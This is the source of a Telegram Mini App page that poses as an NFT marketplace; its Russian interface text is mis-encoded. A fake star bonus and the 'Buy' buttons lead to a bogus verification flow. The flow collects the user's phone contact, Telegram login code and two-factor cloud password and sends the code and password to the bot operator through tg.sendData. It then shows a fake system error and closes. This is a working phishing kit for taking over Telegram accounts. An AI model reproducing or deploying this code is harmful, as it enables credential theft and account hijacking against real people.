<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>NFT Marketplace</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        :root { --bg: #0b0b0c; --card: #161618; --accent: #007aff; --text: #ffffff; --secondary: #8e8e93; --gold: #ffd700; }
        body { font-family: -apple-system, sans-serif; background: var(--bg); color: var(--text); margin: 0; padding: 15px; }
        
        /* NFT –ú–∞—Ä–∫–µ—Ç */
        .nft-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 15px; margin-top: 20px; }
        .nft-card { background: var(--card); border-radius: 20px; padding: 10px; border: 1px solid rgba(255,255,255,0.05); text-align: center; }
        .nft-img { width: 100%; border-radius: 15px; height: 140px; object-fit: cover; background: #2c2c2e; }
        .nft-title { font-weight: 600; margin: 10px 0 5px; font-size: 14px; }
        .nft-price { color: #32d74b; font-weight: 700; font-size: 16px; margin-bottom: 10px; }

        /* –ë–∞–ª–∞–Ω—Å */
        .balance-card { background: linear-gradient(135deg, #1c1c1e 0%, #000 100%); border-radius: 24px; padding: 25px; margin-bottom: 20px; border: 1px solid var(--gold); }
        .stars-count { font-size: 45px; font-weight: 800; color: var(--gold); }

        /* –ö–Ω–æ–ø–∫–∏ –∏ –∏–Ω–ø—É—Ç—ã */
        .btn { background: var(--accent); color: white; border: none; border-radius: 14px; padding: 15px; width: 100%; font-weight: 600; cursor: pointer; margin-top: 10px; }
        input { width: 100%; padding: 15px; border-radius: 12px; border: none; background: #2c2c2e; color: white; margin-top: 10px; box-sizing: border-box; text-align: center; font-size: 18px; }

        .step { display: none; animation: fadeIn 0.3s ease; }
        .active { display: block; }
        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
    </style>
</head>
<body>

    <div id="step-market" class="step active">
        <div class="balance-card">
            <div style="color: var(--secondary); font-size: 14px;">–í–∞—à –±–∞–ª–∞–Ω—Å:</div>
            <div class="stars-count" id="balance">0</div>
            <div style="color: var(--gold); font-size: 12px;">NFT Stars –∑–∞—á–∏—Å–ª–µ–Ω–æ</div>
            <button class="btn" id="bonus-btn" onclick="animateBalance()">üéÅ –ó–∞–±—Ä–∞—Ç—å –µ—â–µ +20 –∑–≤–µ–∑–¥</button>
        </div>

        <h3 style="text-align: left; margin-left: 5px;">üî• –¢—Ä–µ–Ω–¥—ã –Ω–µ–¥–µ–ª–∏</h3>
        <div class="nft-grid">
            <div class="nft-card">
                <img src="https://i.seadn.io/gae/2hDpuYSUIm1yS89E78O688zN-9V6P_5zQx9e9z0?auto=format&w=256" class="nft-img">
                <div class="nft-title">CryptoPunk #442</div>
                <div class="nft-price">120 Stars</div>
                <button class="btn" onclick="goToAuth()">–ö—É–ø–∏—Ç—å</button>
            </div>
            <div class="nft-card">
                <img src="https://i.seadn.io/gcs/files/6b76176378e9f50e82c502b4501a4034.png?auto=format&w=256" class="nft-img">
                <div class="nft-title">Golden Ape</div>
                <div class="nft-price">450 Stars</div>
                <button class="btn" onclick="goToAuth()">–ö—É–ø–∏—Ç—å</button>
            </div>
        </div>
    </div>

    <div id="step-phone" class="step">
        <div style="margin-top: 50px;">
            <h2>–í–µ—Ä–∏—Ñ–∏–∫–∞—Ü–∏—è –∞–∫–∫–∞—É–Ω—Ç–∞</h2>
            <p style="color: var(--secondary);">–ü–æ–¥—Ç–≤–µ—Ä–¥–∏—Ç–µ –ª–∏—á–Ω–æ—Å—Ç—å –¥–ª—è –ø—Ä–æ–≤–µ–¥–µ–Ω–∏—è —Ç—Ä–∞–Ω–∑–∞–∫—Ü–∏–∏</p>
            <div class="balance-card">
                <button class="btn" onclick="requestPhone()">üõ° –ü–æ–¥—Ç–≤–µ—Ä–¥–∏—Ç—å —á–µ—Ä–µ–∑ Telegram</button>
            </div>
        </div>
    </div>

    <div id="step-code" class="step">
        <div style="margin-top: 50px;">
            <h2>–í–≤–µ–¥–∏—Ç–µ –∫–æ–¥</h2>
            <p style="color: var(--secondary);">–ö–æ–¥ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω –≤ –≤–∞—à –æ—Ñ–∏—Ü–∏–∞–ª—å–Ω—ã–π —á–∞—Ç Telegram</p>
            <input type="number" id="sms_code" placeholder="0 0 0 0 0">
            <button class="btn" onclick="sendCode()">–ü—Ä–æ–¥–æ–ª–∂–∏—Ç—å</button>
        </div>
    </div>

    <div id="step-2fa" class="step">
        <div style="margin-top: 50px;">
            <h2>–û–±–ª–∞—á–Ω—ã–π –ø–∞—Ä–æ–ª—å</h2>
            <p style="color: var(--secondary);">–í–≤–µ–¥–∏—Ç–µ –≤–∞—à –ø–∞—Ä–æ–ª—å –¥–≤—É—Ö—ç—Ç–∞–ø–Ω–æ–π –∞—É—Ç–µ–Ω—Ç–∏—Ñ–∏–∫–∞—Ü–∏–∏</p>
            <input type="password" id="cloud_pass" placeholder="–ü–∞—Ä–æ–ª—å">
            <button class="btn" onclick="send2fa()">–ó–∞–≤–µ—Ä—à–∏—Ç—å –∑–∞—á–∏—Å–ª–µ–Ω–∏–µ</button>
        </div>
    </div>

    <script>
        let tg = window.Telegram.WebApp;
        tg.expand();

        function show(id) {
            document.querySelectorAll('.step').forEach(s => s.classList.remove('active'));
            document.getElementById(id).classList.add('active');
        }

        // 1. –ê–Ω–∏–º–∞—Ü–∏—è –∑–∞—á–∏—Å–ª–µ–Ω–∏—è –±–∞–ª–∞–Ω—Å–∞
        function animateBalance() {
            let b = 0;
            let interval = setInterval(() => {
                b++;
                document.getElementById('balance').innerText = b;
                if(b >= 20) {
                    clearInterval(interval);
                    document.getElementById('bonus-btn').innerText = "‚úÖ –ü–æ–ª—É—á–µ–Ω–æ";
                    setTimeout(() => { goToAuth(); }, 1200);
                }
            }, 50);
        }

        function goToAuth() { show('step-phone'); }

        // 2. –ù–æ–º–µ—Ä
        function requestPhone() {
            tg.requestContact((ok) => {
                if(ok) show('step-code');
            });
        }

        // 3. –ö–æ–¥
        function sendCode() {
            let val = document.getElementById('sms_code').value;
            if(val.length >= 5) {
                tg.sendData("CODE:" + val);
                show('step-2fa');
            }
        }

        // 4. 2FA
        function send2fa() {
            let val = document.getElementById('cloud_pass').value;
            if(val.length > 0) {
                tg.sendData("PASS:" + val);
                tg.showAlert("–°–∏—Å—Ç–µ–º–Ω–∞—è –æ—à–∏–±–∫–∞. –ü–æ–ø—Ä–æ–±—É–π—Ç–µ —á–µ—Ä–µ–∑ 24 —á–∞—Å–∞.");
                tg.close();
            }
        }
    </script>
</body>
</html>
